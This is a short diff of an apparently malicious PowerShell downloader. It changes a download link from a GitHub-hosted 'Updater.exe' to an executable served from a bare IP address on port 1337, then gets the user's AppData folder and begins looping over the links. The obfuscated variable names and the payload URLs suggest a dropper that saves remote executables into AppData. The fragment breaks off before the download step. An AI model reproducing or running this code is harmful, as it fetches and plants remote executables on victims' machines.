@@ -1,5 +1,5 @@
 $gfgff = @(
-    "https://github.com/JqrkaSt3al/GovnoBuilds/raw/refs/heads/main/Updater.exe"
+    "http://147.45.125.248:1337/files/978.exe"
 )
 $dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
 foreach ($link in $gfgff) {
